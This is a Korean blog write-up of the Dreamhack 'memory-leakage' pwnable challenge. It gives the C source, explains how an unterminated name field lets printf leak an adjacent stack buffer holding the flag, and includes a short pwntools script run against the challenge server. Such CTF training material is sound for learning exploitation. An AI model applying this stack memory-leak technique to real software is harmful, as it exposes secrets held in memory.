---
title: Dreamhack wargame memory-leakage write-up
tags: [Dreamhack, pwnable, memory-leakage]
style: 
color: 
description: stack 영역에서 발생하는 취약점을 알아보자. 
---

## Code Analysis
---
~~~ c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

FILE *fp;

struct my_page {
	char name[16];
	int age;
};

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
	struct my_page my_page;
	char flag_buf[56];
	int idx;

	memset(flag_buf, 0, sizeof(flag_buf));
	
	initialize();

	while(1) {
		printf("1. Join\n");
		printf("2. Print information\n");
		printf("3. GIVE ME FLAG!\n");
		printf("> ");
		scanf("%d", &idx);
		switch(idx) {
			case 1:
				printf("Name: ");
				read(0, my_page.name, sizeof(my_page.name));

				printf("Age: ");
				scanf("%d", &my_page.age);
				break;
			case 2:
				printf("Name: %s\n", my_page.name);
				printf("Age: %d\n", my_page.age);
				break;
			case 3:
				fp = fopen("/flag", "r");
				fread(flag_buf, 1, 56, fp);
				break;
			default:
				break;
		}
	}

}
~~~
main 함수의 switch문에서 1번은  이름과 나이를 입력한다. 2번은 
이름과 나이를 출력하고 3번을 입력하면 플래그를 읽어와서 flag_buf에 저장한다. 
<br>

<br>

## Vulnerability Analysis
---
read 함수와 scanf 함수에서 취약점이 발생한다.
printf 함수는 NULL 문자가 나오기 전까지 출력을 하는데 name과 age를 꽉 채워주면 NULL 문자가 없기 때문에 두 변수의 바로 아래 스택인 flag_buf에 있는 값이 같이 출력될 것이다. age는 int형이기 때문에 int의 최댓값인 2147483647을 넣어줬다.

## Exploit
---
``` python
from pwn import *

p = remote('host1.dreamhack.games','15914')
#p = process('./bof')

p.recvuntil("> ")
p.sendline("3")

p.recvuntil("> ")
p.sendline("1")

p.recvuntil("Name: ")
p.sendline("A" * 16)

p.recvuntil("Age: ")
p.sendline("2147483647")

p.recvuntil("> ")
p.sendline("2")

p.interactive()
```

![img1](/assets/memory-leakage/1.png)

FLAG 등장!

<br>

### Good Game!
EZ



